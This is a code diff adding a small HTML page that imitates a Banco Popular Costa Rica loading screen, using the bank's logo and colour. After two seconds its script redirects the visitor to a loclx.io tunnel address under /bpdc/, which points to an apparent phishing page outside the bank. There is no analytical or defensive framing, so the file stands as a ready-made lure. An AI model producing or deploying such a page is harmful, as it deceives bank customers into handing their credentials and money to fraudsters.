@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loader BP Costa Rica</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #F57C00; /* Naranja característico */
+        }
+        .loader {
+            width: 150px;
+            height: 150px;
+            background: url('https://www.bancopopular.fi.cr/wp-content/themes/bp/assets/img/bp-logo.svg') no-repeat center;
+            background-size: contain;
+            animation: pulse 2s infinite ease-in-out;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+    </style>
+    <script>
+        setTimeout(function() {
+            window.location.href = "https://igtujpypwmpyppeextzihgxxfdeerz.loclx.io/bpdc/";
+        }, 2000); //
+    </script>
+</head>
+<body>
+    <div class="loader"></div>
+</body>
+</html>
